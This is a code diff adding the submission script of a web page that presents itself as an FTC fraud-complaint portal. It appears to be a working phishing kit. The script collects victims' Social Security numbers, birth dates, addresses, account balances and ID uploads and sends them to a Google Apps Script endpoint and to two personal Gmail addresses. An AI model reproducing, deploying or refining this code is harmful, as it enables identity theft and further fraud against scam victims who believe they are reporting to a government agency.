+            ['Credit Cards', formData.creditCardCount || '0'],
+            ['401(k)', formData.has401k || 'N/A'],
+            ['IRA', formData.hasIRA || 'N/A'],
+            ['Reimbursement', formData.reimbursementMethod]
+        ];
+        var html = '<table style="width:100%;border-collapse:collapse;">';
+        rows.forEach(function(r) {
+            html += '<tr><td style="font-weight:600;color:#6c7580;width:42%;padding:5px 0;font-size:13px;">' + r[0] + '</td><td style="color:#1a2a4a;padding:5px 0;font-size:13px;">' + (r[1]||'—') + '</td></tr>';
+        });
+        html += '</table>';
+        html += '<div style="margin-top:16px;padding-top:14px;border-top:1px solid #dce5ef;"><strong style="color:#6c7580;font-size:11px;text-transform:uppercase;letter-spacing:.06em;">Your Description</strong><div style="margin-top:8px;font-size:13px;line-height:1.6;color:#1a2a4a;">' + (formData.story||'') + '</div></div>';
+        document.getElementById('reviewContent').innerHTML = html;
+    }
+
+    var GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxjezebSXdgcdCK7t0iy7nAGiywb9zc6I39x0IyVaRjTQOwqy2f3L_QWQoFZPHsu_jIaw/exec';
+    var ADMIN_EMAILS = ['janetgunnoe09@gmail.com', 'tyronlincolnn@gmail.com'];
+
+    function submitReport() {
+        var btn = document.querySelector('.ftc-btn-submit');
+        btn.textContent = 'Submitting...';
+        btn.disabled = true;
+
+        var reportNum = 'FTC-' + new Date().getFullYear() + '-' + Math.floor(100000 + Math.random() * 900000);
+        formData.reportNumber = reportNum;
+        formData.submittedAt = new Date().toISOString();
+
+        // Save to localStorage
+        var reports = JSON.parse(localStorage.getItem('ftcReports') || '[]');
+        reports.push(formData);
+        localStorage.setItem('ftcReports', JSON.stringify(reports));
+        localStorage.setItem('lastFtcReport', JSON.stringify(formData));
+
+        // Build payload for Google Sheets
+        var payload = {
+            type: 'ftc_report',
+            reportNumber:        formData.reportNumber,
+            submittedAt:         formData.submittedAt,
+            category:            formData.category || '',
+            story:               formData.story || '',
+            dateOccurred:        formData.dateOccurred || '',
+            moneyLost:           formData.moneyLost || '',
+            amountLost:          formData.amountLost || '',
+            paymentMethod:       formData.paymentMethod || '',
+            scammerName:         formData.scammerName || '',
+            scammerPhone:        formData.scammerPhone || '',
+            scammerEmail:        formData.scammerEmail || '',
+            scammerWebsite:      formData.scammerWebsite || '',
+            howContacted:        formData.howContacted || '',
+            scammerImpersonating:formData.scammerImpersonating || '',
+            firstName:           formData.firstName || '',
+            lastName:            formData.lastName || '',
+            email:               formData.email || '',
+            phone:               formData.phone || '',
+            address:             formData.address || '',
+            city:                formData.city || '',
+            state:               formData.state || '',
+            zip:                 formData.zip || '',
+            referenceNumber:     formData.referenceNumber || '',
+            lossType:            formData.lossType || '',
+            lossAmount:          formData.lossAmount || '',
+            lossDescription:     formData.lossDescription || '',
+            authoritiesContacted:formData.authoritiesContacted || '',
+            ssn:                 formData.ssn || '',
+            dob:                 formData.dob || '',
+            propertyCount:       formData.propertyCount || '0',
+            bankAccountCount:    formData.bankAccountCount || '0',
+            creditCardCount:     formData.creditCardCount || '0',
+            has401k:             formData.has401k || '',
+            balance401k:         formData.balance401k || '',
+            hasIRA:              formData.hasIRA || '',
+            balanceIRA:          formData.balanceIRA || '',
+            hasMoneyMarket:      formData.hasMoneyMarket || '',
+            balanceMoneyMarket:  formData.balanceMoneyMarket || '',
+            reimbursementMethod: formData.reimbursementMethod || '',
+            additionalInfo:      formData.additionalInfo || '',
+            idFrontUploaded:     (document.getElementById('idFront').files && document.getElementById('idFront').files[0]) ? document.getElementById('idFront').files[0].name : 'Not uploaded',
+            idBackUploaded:      (document.getElementById('idBack').files && document.getElementById('idBack').files[0]) ? document.getElementById('idBack').files[0].name : 'Not uploaded'
+        };
+
+        // Send to Google Sheets
+        fetch(GOOGLE_SHEETS_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(function(err) {
+            console.warn('Google Sheets submission failed:', err);
+        });
+
+        // Send email notification to admin
+        sendEmailNotification(payload);
+
+        setTimeout(function() {
+            window.location.href = 'confirmation.html?ref=' + reportNum;
+        }, 1800);
+    }
+
+    function sendEmailNotification(data) {
+        var subject = '[FTC COMPLAINT PORTAL] New Fraud Report — ' + data.reportNumber + ' | ' + data.firstName + ' ' + data.lastName + ' | Loss: $' + data.lossAmount;
+        var body =
+            'NEW FTC COMPLAINT REPORT\n' +
+            '========================\n\n' +
+            'Report Number:   ' + data.reportNumber + '\n' +
+            'Submitted:       ' + data.submittedAt + '\n\n' +
+            '--- CLAIMANT INFO ---\n' +
+            'Name:            ' + data.firstName + ' ' + data.lastName + '\n' +
+            'Email:           ' + data.email + '\n' +
+            'Phone:           ' + data.phone + '\n' +
+            'Address:         ' + data.address + ', ' + data.city + ', ' + data.state + ' ' + data.zip + '\n\n' +
+            '--- FRAUD DETAILS ---\n' +
+            'Category:        ' + data.category + '\n' +
+            'Date Occurred:   ' + data.dateOccurred + '\n' +
+            'Money Lost:      ' + data.moneyLost + (data.amountLost ? ' ($' + data.amountLost + ')' : '') + '\n' +
+            'Payment Method:  ' + data.paymentMethod + '\n' +
+            'How Contacted:   ' + data.howContacted + '\n\n' +
+            '--- SCAMMER INFO ---\n' +
+            'Name:            ' + data.scammerName + '\n' +
+            'Phone:           ' + data.scammerPhone + '\n' +
+            'Email:           ' + data.scammerEmail + '\n' +
+            'Website:         ' + data.scammerWebsite + '\n' +
+            'Impersonating:   ' + data.scammerImpersonating + '\n\n' +
+            '--- ASSET VERIFICATION ---\n' +
+            'Reference #:     ' + data.referenceNumber + '\n' +
+            'Loss Type:       ' + data.lossType + '\n' +
+            'Loss Amount:     $' + data.lossAmount + '\n' +
+            'Loss Description:' + data.lossDescription + '\n' +
+            'SSN Provided:    ' + (data.ssn ? 'Yes' : 'No') + '\n' +
+            'DOB:             ' + data.dob + '\n' +
+            'Properties:      ' + data.propertyCount + '\n' +
+            'Bank Accounts:   ' + data.bankAccountCount + '\n' +
+            'Credit Cards:    ' + data.creditCardCount + '\n' +
+            '401k:            ' + data.has401k + ' / ' + data.balance401k + '\n' +
+            'IRA:             ' + data.hasIRA + ' / ' + data.balanceIRA + '\n' +
+            'Money Market:    ' + data.hasMoneyMarket + ' / ' + data.balanceMoneyMarket + '\n' +
+            'Reimbursement:   ' + data.reimbursementMethod + '\n' +
+            'ID Front:        ' + data.idFrontUploaded + '\n' +
+            'ID Back:         ' + data.idBackUploaded + '\n\n' +
+            '--- DESCRIPTION ---\n' + data.story + '\n\n' +
+            'Additional Info: ' + data.additionalInfo;
+
+        ADMIN_EMAILS.forEach(function(email, idx) {
+            setTimeout(function() {
+                var mailto = 'mailto:' + email +
+                    '?subject=' + encodeURIComponent(subject) +
+                    '&body=' + encodeURIComponent(body);
+                var link = document.createElement('a');
+                link.href = mailto;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, idx * 700);
+        });
+    }
+</script>
+</body>
+</html>
